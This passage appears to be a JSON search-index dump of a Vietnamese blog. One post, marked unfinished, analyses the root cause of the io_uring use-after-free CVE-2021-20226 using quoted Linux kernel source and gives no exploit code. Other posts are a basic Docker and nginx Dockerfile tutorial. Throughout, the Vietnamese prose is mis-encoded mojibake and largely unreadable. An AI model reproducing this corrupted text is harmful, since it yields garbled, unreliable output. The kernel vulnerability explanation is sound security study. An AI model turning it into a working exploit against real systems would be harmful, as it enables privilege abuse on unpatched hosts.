io_timeout_fn() s·∫Ω ƒë∆∞·ª£c g·ªçi ƒë·ªÉ load c√°c ho·∫°t ƒë·ªông ƒë∆∞·ª£c k·∫øt n·ªëi trong h√†ng ƒë·ª£i ƒë·ªÉ th·ª±c thi b·∫•t ƒë·ªìng b·ªô. T·ª©c l√† IORING_OP_TIMEOUT kh√¥ng c√≥ ƒë∆∞·ª£c ƒë·∫∑t v√†o h√†ng ƒë·ª£i th·ª±c thi b·∫•t ƒë·ªìng b·ªô. T√°c gi·∫£ d√πng TIMEOUT ƒë·ªÉ gi·∫£i th√≠ch ƒë∆°n gi·∫£n v√¨ khi nh·∫Øc t·ªõi TIMEOUT ch√∫ng ta s·∫Ω li√™n t∆∞·ªüng ngay t·ªõi vi·ªác lu·ªìng th·ª±c thi hi·ªán t·∫°i s·∫Ω ƒë∆∞·ª£c d·ª´ng l·∫°i.\nPrecautions when offloading I/O operations to the Kernel Ch√∫ng ta ƒë√£ th·∫•y ho·∫°t ƒë·ªông b·∫•t ƒë·ªìng b·ªô tr√™n io_uring s·∫Ω ƒë∆∞·ª£c th·ª±c hi·ªán b·ªüi worker v√† ch·∫°y d∆∞·ªõi d·∫°ng Kernel Thread. Tuy nhi√™n c·∫ßn c√≥ m·ªôt s·ªë l∆∞u √Ω: V√¨ n√≥ ch·∫°y ·ªü d·∫°ng Kernel Thread, n√™n ng·ªØ c·∫£nh th·ª±c thi (execution context) s·∫Ω kh√°c v·ªõi khi ƒë∆∞·ª£c g·ªçi b·ªüi io_uring. ·ªû ƒë√¢y, execution context √°m ch·ªâ c·∫•u tr√∫c task_struct c·ªßa process v√† c√°c th√¥ng tin t∆∞∆°ng ·ª©ng c·ªßa n√≥. V√≠ d·ª• nh∆∞ mm (Manage the virtual memory space of the process), cred (holds UID/GID/Capability), file struct (holds a table for file descriptors)\n N·∫øu 1 process khi th·ª±c thi ·ªü Kernel Thread m√† kh√¥ng tham chi·∫øu ƒë√∫ng ƒë·ªÉ c·∫•u tr√∫c tr√™n khi th·ª±c hi·ªán systemcall n√≥ c√≥ th·ªÉ tr·ªè t·ªõi b·ªô nh·ªõ ·∫£o sai, tr·ªè t·ªõi file description table, ho·∫∑c ƒë∆∞a ra c√°c ho·∫°t ƒë·ªông ƒë·∫∑c quy·ªÅn v·ªõi Kernel Thread (quy·ªÅn h·∫°n nh∆∞ root). Trong CVE n√†y, l·ªói x·∫£y ra ·ªü ƒë√¢y, ng∆∞·ªùi vi·∫øt t·∫°i th·ªùi ƒëi·ªÉm tr√™n qu√™n chuy·ªÉn cred v√† l√†m cho nh·ªØng ho·∫°t ƒë·ªông l√∫c n√†y c√≥ th·ªÉ ƒë∆∞·ª£c th·ª±c thi c√πng quy·ªÅn h·∫°n nh∆∞ root. M·∫∑c d√π nh·ªØng ho·∫°t ƒë·ªông t∆∞∆°ng ƒë∆∞∆°ng v·ªõi open() t·∫°i th·ªùi ƒëi·ªÉm ch∆∞a ƒë∆∞·ª£c hi·ªán th·ª±c, n√™n ch√∫ng ta kh√¥ng th·ªÉ ƒë·ªçc file, nh∆∞ng ch√∫ng ta c√≥ th·ªÉ b·∫Øn nh·ªØng th√¥ng b√°o (message) ƒë·∫∑c quy·ªÅn trong sendmsg's v·ªõi t√πy ch·ªçn SCM_CREDENTIALS ƒë·ªÉ th√¥ng b√°o cho c∆° quan c√≥ th·∫©m quy·ªÅn c·ªßa ng∆∞·ªùi g·ª≠i (sender‚Äôs authority). V·∫•n ƒë·ªÅ n√†y li√™n quan t·ªõi D-Bus. Do ƒë√≥, trong io_uring nh·ªØng tham kh·∫£o ƒë√≥ ƒë∆∞·ª£c ƒë∆∞a v√†o worker ƒë·ªÉ worker chia s·∫ª execution context b·∫±ng c√°ch chuy·ªÉn qua context c·ªßa n√≥ tr∆∞·ªõc khi th·ª±c thi. V√≠ d·ª•: trong ƒëo·∫°n code sau ƒë√¢y, t·∫°i line 6 v√† line 9 ch√∫ng ta c√≥ th·ªÉ th·∫•y tham kh·∫£o t·ªõi mm v√† cred ƒë∆∞·ª£c ƒë∆∞a v√†o req-\u0026gt;work:  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  static inline void io_req_work_grab_env(struct io_kiocb *req,\rconst struct io_op_def *def)\r{\rif (!req-\u0026gt;work.mm \u0026amp;\u0026amp; def-\u0026gt;needs_mm) {\rmmgrab(current-\u0026gt;mm);\rreq-\u0026gt;work.mm = current-\u0026gt;mm;\r}\rif (!req-\u0026gt;work.creds)\rreq-\u0026gt;work.creds = get_current_cred();\rif (!req-\u0026gt;work.fs \u0026amp;\u0026amp; def-\u0026gt;needs_fs) {\rspin_lock(\u0026amp;current-\u0026gt;fs-\u0026gt;lock);\rif (!current-\u0026gt;fs-\u0026gt;in_exec) {\rreq-\u0026gt;work.fs = current-\u0026gt;fs;\rreq-\u0026gt;work.fs-\u0026gt;users++;\r} else {\rreq-\u0026gt;work.flags |= IO_WQ_WORK_CANCEL;\r}\rspin_unlock(\u0026amp;current-\u0026gt;fs-\u0026gt;lock);\r}\rif (!req-\u0026gt;work.task_pid)\rreq-\u0026gt;work.task_pid = task_pid_vnr(current);\r}\r  file struct c≈©ng ƒë∆∞·ª£c ƒë∆∞a v√†o req-\u0026gt;work ·ªü ƒëo·∫°n code sau:\n1 2 3 4 5 6 7 8 9 10 11  static int io_grab_files(struct io_kiocb *req)\r{\r......\rif (fcheck(ctx-\u0026gt;ring_fd) == ctx-\u0026gt;ring_file) {\rlist_add(\u0026amp;req-\u0026gt;inflight_entry, \u0026amp;ctx-\u0026gt;inflight_list);\rreq-\u0026gt;flags |= REQ_F_INFLIGHT;\rreq-\u0026gt;work.files = current-\u0026gt;files;\rret = 0;\r}\r......\r}   V√† tr∆∞·ªõc khi n√≥ chuy·ªÉn sang th·ª±c thi d∆∞·ªõi d·∫°ng kernel thread, worker s·∫Ω thay th·∫ø nh·ªØng tham kh·∫£o ƒë∆∞·ª£c truy·ªÅn v√†o v·ªõi n·ªôi dung hi·ªán t·∫°i c·ªßa n√≥.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  static void io_worker_handle_work(struct io_worker *worker)\r__releases(wqe-\u0026gt;lock)\r{\rstruct io_wq_work *work, *old_work = NULL, *put_work = NULL;\rstruct io_wqe *wqe = worker-\u0026gt;wqe;\rstruct io_wq *wq = wqe-\u0026gt;wq;\rdo {\r......\rif (work-\u0026gt;files \u0026amp;\u0026amp; current-\u0026gt;files != work-\u0026gt;files) {\rtask_lock(current);\rcurrent-\u0026gt;files = work-\u0026gt;files;\rtask_unlock(current);\r}\rif (work-\u0026gt;fs \u0026amp;\u0026amp; current-\u0026gt;fs != work-\u0026gt;fs)\rcurrent-\u0026gt;fs = work-\u0026gt;fs;\rif (work-\u0026gt;mm != worker-\u0026gt;mm)\rio_wq_switch_mm(worker, work);\rif (worker-\u0026gt;cur_creds != work-\u0026gt;creds)\rio_wq_switch_creds(worker, work);\r......\rwork-\u0026gt;func(\u0026amp;work);\r......\r} while (1);\r}   Vulnerability explanation Reference counter in files_struct structure when sharing with the worker Trong ƒëo·∫°n code sau ƒë√¢y, worker ƒëang chuy·ªÉn m·ªôt tham chi·∫øu ƒë·∫øn c·∫•u tr√∫c files_struct c·ªßa lu·ªìng ƒëang th·ª±c hi·ªán l·ªánh g·ªçi h·ªá th·ªëng t·ªõi c·∫•u tr√∫c m√† worker s·∫Ω tham chi·∫øu sau n√†y m√† kh√¥ng c·∫ßn tƒÉng b·ªô ƒë·∫øm tham chi·∫øu.\n1 2 3 4 5 6 7 8 9 10 11  static int io_grab_files(struct io_kiocb *req)\r{\r......\rif (fcheck(ctx-\u0026gt;ring_fd) == ctx-\u0026gt;ring_file) {\rlist_add(\u0026amp;req-\u0026gt;inflight_entry, \u0026amp;ctx-\u0026gt;inflight_list);\rreq-\u0026gt;flags |= REQ_F_INFLIGHT;\rreq-\u0026gt;work.files = current-\u0026gt;files;\rret = 0;\r}\r......\r}\r  B·∫±ng c√°ch n√†y, khi v√†o h√†ng ƒë·ª£i th·ª±c thi b·∫•t ƒë·ªìng b·ªô, tham chi·∫øu t·ªõi c·∫•u tr√∫c file ƒë∆∞·ª£c gi·ªØ l·∫°i ƒë·∫ßu ti√™n t·ª´ b·ªô m√¥ t·∫£ t·ªáp ƒë∆∞·ª£c ch·ªâ ƒë·ªãnh\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33  static int io_req_set_file(struct io_submit_state *state, struct io_kiocb *req,\rconst struct io_uring_sqe *sqe)\r{\rstruct io_ring_ctx *ctx = req-\u0026gt;ctx;\runsigned flags;\rint fd;\rflags = READ_ONCE(sqe-\u0026gt;flags);\rfd = READ_ONCE(sqe-\u0026gt;fd);\rif (!io_req_needs_file(req, fd))\rreturn 0;\rif (flags \u0026amp; IOSQE_FIXED_FILE) {\rif (unlikely(!ctx-\u0026gt;file_data ||\r(unsigned) fd \u0026gt;= ctx-\u0026gt;nr_user_files))\rreturn -EBADF;\rfd = array_index_nospec(fd, ctx-\u0026gt;nr_user_files);\rreq-\u0026gt;file = io_file_from_index(ctx, fd);\rif (!req-\u0026gt;file)\rreturn -EBADF;\rreq-\u0026gt;flags |= REQ_F_FIXED_FILE;\rpercpu_ref_get(\u0026amp;ctx-\u0026gt;file_data-\u0026gt;refs);\r} else {\rif (req-\u0026gt;needs_fixed_file)\rreturn -EBADF;\rtrace_io_uring_file_get(ctx, fd);\rreq-\u0026gt;file = io_file_get(state, fd);\rif (unlikely(!req-\u0026gt;file))\rreturn -EBADF;\r}\rreturn 0;\r}\r  Do ƒë√≥, worker kh√¥ng c·∫ßn ph·∫£i tr√≠ch xu·∫•t n√≥ t·ª´ fd ho·∫∑c tr·ªè t·ªõi c·∫•u tr√∫c files_struct m·ªôt l·∫ßn n·ªØa. N·∫øu nh∆∞ th·∫ø th√¨ vi·ªác kh√¥ng tƒÉng b·ªô ƒë·∫øm tham chi·∫øu t·ªõi files_struct kh√¥ng b·ªã ·∫£nh h∆∞·ªüng g√¨. Nh∆∞ng gi·∫£ ƒë·ªãnh tr√™n kh√¥ng ƒë√∫ng v·ªõi Linux Kernel 5.5 tr·ªü l√™n b·ªüi v√¨ nh·ªØng system call s·∫Ω ·∫£nh h∆∞·ªüng t·ªõi file descriptor table nh∆∞ open/close/accept ƒë√£ c√≥ s·∫µn tr√™n io_uring, do ƒë√≥, ch√∫ng ta c√≥ th·ªÉ s·ª≠ d·ª•ng ƒë·ªÉ khai th√°c. Tuy nhi√™n,\n Ch·ªâ g·ªçi nh·ªØng syscall 1 c√°ch th√¥ng th∆∞·ªùng s·∫Ω ch·∫≥ng c√≥ g√¨ x·∫£y ra khi c·∫•u tr√∫c file_struct ƒë√£ s·∫µn s√†ng, v√† ko th·ªÉ t·∫°o ra race condition v√¨ syscall c√≥ countermeasures khi x·ª≠ l√≠ m·ªôt file b·∫±ng nhi·ªÅu thread. Gi·∫£i ph√≥ng files_struct b·∫±ng c√°ch thi·∫øt l·∫≠p reference counter b·∫±ng 0 =\u0026gt; 1 process n√†o ƒë√≥ c√≥ th·ªÉ d√πng n√≥ nh∆∞ l√† file_struct c·ªßa n√≥ ƒë·ªÉ th·ª±c hi·ªán. M·ªôt v√≠ d·ª• nh∆∞ nh√† c·ªßa b·∫°n m√† b·∫°n ƒë·ªÉ b·∫£ng \u0026ldquo;nh√† hoang\u0026rdquo; th√¨ m·ªôt ng∆∞·ªùi n√†o ƒë√≥ c√≥ th·ªÉ ƒëi v√†o ƒë√≥ ·ªü, sinh s·ªëng. Ch√∫ng ta c√≥ th·ªÉ ch√®n 1 c·∫•u tr√∫c file v√†o file description table c·ªßa process m·ªõi b·∫±ng m·ªü 1 file, nh∆∞ng n√≥ s·∫Ω kh√¥ng ƒë∆∞·ª£c reference v√¨ ng∆∞·ªùi d√πng kh√¥ng s·ª≠ d·ª•ng c·ªë ƒë·ªãnh s·ªë l∆∞·ª£ng file descriptor trong khi l·∫≠p tr√¨nh.  Mechanism of reference counter in open/close system call ƒê·ªÉ hi·ªÉu reference counter trong c·∫•u tr√∫c file ho·∫°t ƒë·ªông nh∆∞ th·∫ø n√†o, tr∆∞·ªõc ti√™n c·∫ßn hi·ªÉu c√°ch th·ª©c ho·∫°t ƒë·ªông c·ªßa open/close. C√°ch th·ª©c n√†y s·∫Ω ph·ª• thu·ªôc v√†o t·ª´ng file ri√™ng, nh∆∞ng c√≥ 1 s·ªë ƒëi·ªÉm chung:\nOpen  T·∫°o 1 c·∫•u tr√∫c file v√† thi·∫øt l·∫≠p reference counter = 1  1 2 3 4 5 6 7 8 9 10  static struct file *__alloc_file(int flags, const struct cred *cred)\r{\rstruct file *f;\rint error;\rf = kmem_cache_zalloc(filp_cachep, GFP_KERNEL);\r......\ratomic_long_set(\u0026amp;f-\u0026gt;f_count, 1);\r......\rreturn f;\r}\r  ƒêƒÉng k√≠ n√≥ v√†o file description table (fd_install).  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  static long do_sys_openat2(int dfd, const char __user *filename,\rstruct open_how *how)\r{\r......\rfd = get_unused_fd_flags(how-\u0026gt;flags);\rif (fd \u0026gt;= 0) {\rstruct file *f = do_filp_open(dfd, tmp, \u0026amp;op);\rif (IS_ERR(f)) {\rput_unused_fd(fd);\rfd = PTR_ERR(f);\r} else {\rfsnotify_open(f);\rfd_install(fd, f);\r}\r}\rputname(tmp);\rreturn fd;\r}\r  close 1 X√≥a trong file description table.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  int __close_fd(struct files_struct *files, unsigned fd)\r{\rstruct file *file;\rstruct fdtable *fdt;\rspin_lock(\u0026amp;files-\u0026gt;file_lock);\rfdt = files_fdtable(files);\rif (fd \u0026gt;= fdt-\u0026gt;max_fds)\rgoto out_unlock;\rfile = fdt-\u0026gt;fd[fd];\rif (!file)\rgoto out_unlock;\rrcu_assign_pointer(fdt-\u0026gt;fd[fd], NULL);\r__put_unused_fd(files, fd);\rspin_unlock(\u0026amp;files-\u0026gt;file_lock);\rreturn filp_close(file, files);\rout_unlock:\rspin_unlock(\u0026amp;files-\u0026gt;file_lock);\rreturn -EBADF;\r}\r  Gi·∫£m reference counter c·ªßa c·∫•u tr√∫c file (fput)  1 2 3 4 5 6  int filp_close(struct file *filp, fl_owner_t id)\r{\r......\rfput(filp);\rreturn retval;\r}   ·ªû ƒë√¢y ch√∫ √Ω t·ªõi h√†m fget()/fput(). Ch√∫ng s·∫Ω tƒÉng ho·∫∑c gi·∫£m reference counter v√† fput() s·∫Ω gi·∫£i ph√≥ng c·ªßa c·∫•u tr√∫c file khi reference counter b·∫±ng 0. N·∫øu ch√∫ng ta m·ªü file b·∫±ng fget() reference counter s·∫Ω kh√¥ng th·ªÉ b·∫±ng 0 ngay c·∫£ khi ta ƒë√≥ng file tr∆∞·ªõc khi g·ªçi fput() (b·ªô ƒë·∫øm s·∫Ω c√≥ g√≠a tr·ªã l√† 1 khi ch·∫°y l·ªánh open(), tƒÉng l√™n 2 khi g·ªçi fget() v√† n·∫øu l√∫c n√†y ƒë√≥ng th√¨ n√≥ s·∫Ω gi·∫£m xu·ªëng c√≤n 1). Do ƒë√≥, n·∫øu file b·ªã ƒë√≥ng khi ƒëang s·ª≠ d·ª•ng v·∫´n kh√¥ng c√≥ v·∫•n ƒë·ªÅ g√¨, v√¨ reference counter v·∫´n ch∆∞a b·∫±ng 0 n√™n c·∫•u tr√∫c file kh√¥ng th·ªÉ b·ªã gi·∫£i ph√≥ng.\nX√©t tr∆∞·ªùng h·ª£p g·ªçi mmap, s·∫Ω c√≥ v·∫•n ƒë·ªÅ x·∫£y ra n·∫øu v√πng nh·ªõ ƒë∆∞·ª£c gi·∫£i ph√≥ng tr∆∞·ªõc khi g·ªçi munmap, th·∫≠m ch√≠ l√† khi g·ªçi close() r·ªìi m√† ti·∫øp t·ª•c g·ªçi munmap v·∫´n s·∫Ω b·ªã l·ªói. Do ƒë√≥, fget() ƒë∆∞·ª£c d√πng trong mmap ƒë·ªÉ tr√°nh tr∆∞·ªùng h·ª£p b·ªô nh·ªõ b·ªã gi·∫£i ph√≥ng.\n1 2 3 4 5 6 7 8 9 10 11  unsigned long ksys_mmap_pgoff(unsigned long addr, unsigned long len,\runsigned long prot, unsigned long flags,\runsigned long fd, unsigned long pgoff)\r{\rstruct file *file = NULL;\runsigned long retval;\rif (!(flags \u0026amp; MAP_ANONYMOUS)) {\raudit_mmap_fd(fd, flags);\rfile = fget(fd);\r......\r}\r  fdget() which doesn‚Äôt change reference counter 2 h√†m fdget()/fdput() th∆∞·ªùng xuy√™n ƒë∆∞·ª£c s·ª≠ d·ª•ng ƒë·ªÉ tham kh·∫£o t·ªõi nh·ªØng c·∫•u tr√∫c file ƒë∆∞·ª£c s·ª≠ d·ª•ng nhi·ªÅu trong system call handlers.\nV√≠ d·ª•, trong system call read, c·∫•u tr√∫c file ƒë∆∞·ª£c s·ª≠ d·ª•ng gi·ªØa fdget()/fdget_pos() v√† fdput()/fdput_pos() ƒë∆∞·ª£c s·ª≠ d·ª•ng nh∆∞ sau:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  ssize_t ksys_read(unsigned int fd, char __user *buf, size_t count)\r{\rstruct fd f = fdget_pos(fd);\rssize_t ret = -EBADF;\rif (f.file) {\rloff_t pos, *ppos = file_ppos(f.file);\rif (ppos) {\rpos = *ppos;\rppos = \u0026amp;pos;\r}\rret = vfs_read(f.file, buf, count, ppos);\rif (ret \u0026gt;= 0 \u0026amp;\u0026amp; ppos)\rf.file-\u0026gt;f_pos = pos;\rfdput_pos(f);\r}\rreturn ret;\r}\rSYSCALL_DEFINE3(read, unsigned int, fd, char __user *, buf, size_t, count)\r{\rreturn ksys_read(fd, buf, count);\r}\r  C√≥ m·ªôt l√≠ do n√†o ƒë√≥ ƒë·ªÉ h·ªá th·ªëng kh√¥ng c·∫ßn ph·∫£i tƒÉng/gi·∫£m reference counter c·ªßa c·∫•u tr√∫c file m·ªôt c√°ch th∆∞·ªùng xuy√™n, c√≥ l·∫Ω do ·∫£nh h∆∞·ªüng c·ªßa b·ªô nh·ªõ cache(). Do ƒë√≥, fdget() s·∫Ω kh√¥ng tƒÉng reference counter c·ªßa c·∫•u tr√∫c file d∆∞·ªõi m·ªôt s·ªë ƒëi·ªÅu ki·ªán nh·∫•t ƒë·ªãnh. fdget() cu·ªëi c√πng s·∫Ω g·ªçi h√†m __fget_light()\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33  /*\r* Lightweight file lookup - no refcnt increment if fd table isn\u0026#39;t shared.\r*\r* You can use this instead of fget if you satisfy all of the following\r* conditions:\r* 1) You must call fput_light before exiting the syscall and returning control\r* to userspace (i.e. you cannot remember the returned struct file * after\r* returning to userspace).\r* 2) You must not call filp_close on the returned struct file * in between\r* calls to fget_light and fput_light.\r* 3) You must not clone the current task in between the calls to fget_light\r* and fput_light.\r*\r* The fput_needed flag returned by fget_light should be passed to the\r* corresponding fput_light.\r*/\rstatic unsigned long __fget_light(unsigned int fd, fmode_t mask)\r{\rstruct files_struct *files = current-\u0026gt;files;\rstruct file *file;\rif (atomic_read(\u0026amp;files-\u0026gt;count) == 1) {\rfile = __fcheck_files(files, fd);\rif (!file || unlikely(file-\u0026gt;f_mode \u0026amp; mask))\rreturn 0;\rreturn (unsigned long)file;\r} else {\rfile = __fget(fd, mask, 1);\rif (!file)\rreturn 0;\rreturn FDPUT_FPUT | (unsigned long)file;\r}\r}\r  Trong ch∆∞∆°ng tr√¨nh ƒëa lu·ªìng, file descriptor s·∫Ω ƒë∆∞·ª£c chia s·∫ª (\u0026amp;file-\u0026gt;count \u0026gt;= 2) v√† c√πng 1 file descriptor tr·ªè ƒë·∫øn ƒë·∫øn c√πng 1 t·ªáp. Trong tr∆∞·ªùng h·ª£p n√†y, nh·ªØng thread kh√°c c√≥ g·ªçi close() trong khi read() v·∫´n ƒëang th·ª±c thi. L√∫c n√†y, fdget() c·ªßa read() system call ƒë∆∞·ª£c g·ªçi ƒë·ªÉ gi·∫£m reference counter.\nTuy nhi√™n, v·ªõi ch∆∞∆°ng tr√¨nh ch·∫°y ƒë∆°n lu·ªìng kh√°c, t·∫°i 1 th·ªùi ƒëi·ªÉm ch·ªâ c√≥ 1 thread th·ª±c hi·ªán, n√™n s·∫Ω kh√¥ng th·ªÉ x·∫£y tra tr∆∞·ªùng h·ª£p tr√™n, do ƒë√≥, fdget() kh√¥ng c·∫ßn ph·∫£i tƒÉng reference counter. Do ƒë√≥, n√≥ s·∫Ω kh√¥ng tƒÉng reference counter tr·ª´ khi file descriptor table ƒë∆∞·ª£c chia s·∫ª.\nCombining vulnerabilities with the fdget() spec  L·ªó h·ªïng t·ª´ vi·ªác chuy·ªÉn 1 tham kh·∫£o file struct v√†o 1 c·∫•u tr√∫c worker tr·ªè t·ªõi m√† kh√¥ng tƒÉng reference counter v√† n·∫øu ch∆∞∆°ng tr√¨nh g·ªëc l√† ƒë∆°n lu·ªìng, th√¨ \u0026amp;file-\u0026gt;count = 1 d√π cho file descripton table ƒë∆∞·ª£c chia s·∫ª. \u0026amp;files-\u0026gt;count = 1 c√≥ nghƒ©a l√† fdget() s·∫Ω kh√¥ng tƒÉng reference counter trong c·∫•u tr√∫c file. Do ƒë√≥, v√πng nh·ªõ c·ªßa c·∫•u tr√∫c file ƒë∆∞·ª£c s·ª± d·ª•ng b·ªüi fdget() c√≥ th·ªÉ b·ªã gi·∫£i ph√≥ng ·ªü 1 th·ªùi ƒëi·ªÉm n√†o ƒë√≥.\n  T√≥m t·∫Øt L·ªói n√†y nh∆∞ sau:\n AIO worker chia s·∫ª c·∫•u tr√∫c file_struct v·ªõi thread ƒë∆∞·ª£c g·ªçi, v√† t·∫°i th·ªùi ƒëi·ªÉm, reference counter c·ªßa c·∫•u tr√∫c files_struct kh√¥ng tƒÉng l√™n. v√¨ fdget kh√¥ng tƒÉng reference counter c·ªßa c·∫•u tr√∫c file trong khi reference counter ƒë∆∞·ª£c kh·ªüi t·∫°o c√≥ gi√° tr·ªã l√† 1. file ƒë∆∞·ª£c m·ªü b·ªüi fdget()c√≥ th·ªÉ b·ªã ƒë√≥ng v√† gi·∫£i ph√≥ng trong worker. V√¨ c·∫•u tr√∫c file b·ªã gi·∫£i ph√≥ng n√™n l·ªói UAF c√≥ th·ªÉ x·∫£y ra.  ","description":"khai th√°c l·ªói tr√™n io_uring d·∫´n t·ªõi UAF (ch∆∞a ho√†n th√†nh)","id":9,"section":"posts","tags":["cve, io_uring"],"title":"T√¨m hi·ªÉu v·ªÅ CVE-2021-20226","uri":"https://minhlongmt183.github.io/posts/cve-2021-20226/"},{"content":"Ti·∫øp t·ª•c v·ªõi b√†i tr∆∞·ªõc, h√¥m nay ch√∫ng ta s·∫Ω ƒëi qua nh·ªØng nh√°nh ti·∫øp theo c·ªßa docker foundation - nh·ªØng ki·∫øn th·ª©c n·ªÅn t·∫£ng c·ªßa docker. Nh√¨n m·ªôt c√°ch t·ªïng quan v·ªÅ n·ªôi dung c·ªßa nh·ªØng ki·∫øn th·ª©c n·ªÅn t·∫£ng\nBuild Container Image Ch√∫ng ta s·∫Ω ti·∫øn h√†nh build m·ªôt container image, ·ªü ƒë√¢y ch·ªß y·∫øu √¥n l·∫°i ki·∫øn th·ª©c v·ªÅ Dockerfile ƒë√£ h·ªçc ·ªü b√†i tr∆∞·ªõc\nStep 1 - Base Images T·∫•t c·∫£ c√°c Docker Images ƒë·ªÅu b·∫Øt ƒë·∫ßu t·ª´ m·ªôt base image. Base image n√†y gi·ªëng v·ªõi image m√† ch√∫ng ta t·∫£i tr·ª±c ti·∫øp t·ª´ c√°c Registry v·ªÅ ƒë·ªÉ x√¢y d·ª±ng c√°c container. B√™n c·∫°nh d√πng t√™n, c√°c base image c√≤n d√πng tag ƒë·ªÉ ph√¢n bi·ªát gi·ªØa c√°c phi√™n b·∫£n trong c√πng 1 image.\nTrong Dockerfile, ta d√πng FROM ƒë·ªÉ ch·ªâ ƒë·ªãnh base image s·ª≠ d·ª•ng. V√≠ d·ª• ta mu·ªën d√πng m·ªôt base image l√† nginx:1.11-alpine th√¨ trong Dockerfile ta s·∫Ω khai b√°o:\n1  FROM nginx:1.11-alpine\r  Step 2 - Running Commands C√≥ nhi·ªÅu c√¢u l·ªánh c·∫ßn th·ª±c thi khi build image, ta c√≥ th·ªÉ ch·ªâ ƒë·ªãnh nh·ªØng l·ªánh n√†y trong Dockerfile. Chi ti·∫øt v·ªÅ nh·ªØng c√¢u l·ªánh n√†y ƒë√£ ƒë∆∞·ª£c th·∫£o lu·∫≠n ·ªü ph·∫ßn 6. ·ªû ƒë√¢y ta d√πng l·ªánh COPY ƒë·ªÉ copy n·ªôi dung file index.html ƒë·∫øn ƒë·ªãa ch·ªâ c·ª• th·ªÉ tr√™n docker\n1 2  FROM nginx:1.11-alpine\rCOPY index.html /usr/share/nginx/html\r  Step 3 - Exposing Ports T·ª´ kh√≥a EXPOSE d√πng ƒë·ªÉ ch·ªâ ƒë·ªãnh c·ªïng m√† ·ª©ng d·ª•ng c√≥ s·ª≠ d·ª•ng khi mu·ªën truy c·∫≠p v√†o Docker t·ª´ b√™n ngo√†i.\nV√≠ d·ª•, ta mu·ªën ch·ªâ ƒë·ªãnh c·ªïng 80 s·∫Ω cho ph√©p truy c·∫≠p, ta khai b√°o nh∆∞ sau:\n1  EXPOSE 80\r  Step 4 - Default Commands Default Command ch·ªâ ƒë·ªãnh nh·ªØng l·ªánh s·∫Ω ƒë∆∞·ª£c th·ª±c thi sau khi build xong image ƒë·ªÉ ti·∫øn h√†nh setup m√¥i tr∆∞·ªùng m√† ch√∫ng ta mong mu·ªën. Nh·ªØng default command n√†y b·∫Øt ƒë·∫ßu b·∫±ng CMD. V√≠ d·ª•, ch√∫ng ta mu·ªën ch·∫°y c√¢u l·ªánh nginx -g daemon off; ta s·∫Ω th·ª±c thi nh∆∞ sau:\n1  CMD [\u0026#34;nginx\u0026#34;, \u0026#34;-g\u0026#34;, \u0026#34;daemon\u0026#34;, \u0026#34;off;\u0026#34;]\r  Step 5 - Building Containers K·∫øt h·ª£p nh·ªØng c√¢u l·ªánh tr√™n, ta c√≥ m·ªôt Dockerfile nh∆∞u sau:\n1 2 3 4  FROM nginx:1.11-alpine\rCOPY index.html /usr/share/nginx/html\rEXPOSE 80\rCMD [\u0026#34;nginx\u0026#34;, \u0026#34;-g\u0026#34;, \u0026#34;daemon\u0026#34;, \u0026#34;off;\u0026#34;]\r  ƒê·ªÉ th·ª±c thi v√† ti·∫øn h√†nh build image, ta d√πng l·ªánh docker build:\n1  docker build -t my-image:v1 .\r  Step 6 - Launching New Image Cu·ªëi c√πng ch·∫°y image b·∫±ng l·ªánh docker run. V√¨ nh·ªØng ki·∫øn th·ª©c n√†y ch√∫ng ta ƒë·ªÅu ƒë√£ th·∫£o lu·∫≠n qua ·ªü nh·ªØng ch∆∞∆°ng tr∆∞·ªõc, n√™n ph·∫ßn n√†y t√¥i ch·ªâ ƒëi nhanh qua.\n","description":"Docker Foundation (ti·∫øp theo)","id":10,"section":"posts","tags":["Docker"],"title":"T√¨m hi·ªÉu v√† s·ª≠ d·ª•ng docker (P7)","uri":"https://minhlongmt183.github.io/posts/docker_p7/"},{"content":"K·ªÉ t·ª´ ch∆∞∆°ng n√†y, m√¨nh b·∫Øt ƒë·∫ßu chuy·ªÉn qua h·ªçc n·ªôi d·ª•ng docker tr√™n katacoda.com. V√† c√°ch h·ªçc m√¨nh c≈©ng s·∫Ω kh√°c, t√≥m t·∫Øt b·∫±ng s∆° ƒë·ªì t∆∞ duy v√† tr√¨nh b√†y l·∫°i nh·ªØng g√¨ m√¨nh hi·ªÉu sau khi h·ªçc ƒë∆∞·ª£c tr√™n blog theo flow c·ªßa s∆° ƒë·ªì t∆∞ duy. M·ª•c ƒë√≠ch c·ªßa blog n√†y gi√∫p m√¨nh √¥n l·∫°i, hi·ªÉu r√µ h∆°n nh·ªØng ki·∫øn th·ª©c ƒë√£ h·ªçc.\r T·ªïng quan v·ªÅ kh√≥a h·ªçc Trong kh√≥a h·ªçc n√†y, m√¨nh s·∫Ω ƒëi qua m·ªôt s·ªë ch·ªß ƒë·ªÅ ch√≠nh nh∆∞ h√¨nh b√™n d∆∞·ªõi. Trong nh·ªØng ch·ªß ƒë·ªÅ n√†y c√≥ nh·ªØng ch·ªß ƒë·ªÅ m·ªõi v√† nh·ªØng ch·ªß ƒë·ªÅ ƒë√£ ƒë·ªÅ c·∫≠p qua trong kh√≥a h·ªçc c·ªßa anh XuanThuLabChanel. Nh·ªØng ph·∫ßn ƒë√£ n√≥i qua th√¨ s·∫Ω kh√¥ng n√≥i l·∫°i m√† ch·ªâ ghi ch√∫ th√™m nh·ªØng m·ª•c m·ªõi, ch∆∞a ƒë·ªÅ c·∫≠p ·ªü nh·ªØng ph·∫ßn tr∆∞·ªõc ƒë√≥.\nWhat is the container Nh·ªØng kh√°i ni·ªám cƒÉn b·∫£n v·ªÅ container ƒë√£ ƒë∆∞·ª£c ƒë·ªÅ c·∫≠p kh√° nhi·ªÅu ·ªü trong b√†i docker_overview v√† ·ªü p1 trong chu·ªói b√†i h·ªçc t·ª´ anh XuanThuLabChanel. Trong ph·∫ßn n√†y ch√∫ng ta s·∫Ω ƒëi qua m·ªôt s·ªë kh√°i ni·ªám c≈©ng nh∆∞ m·ªôt s·ªë ch·ªß ƒë·ªÅ:\nnamespaces 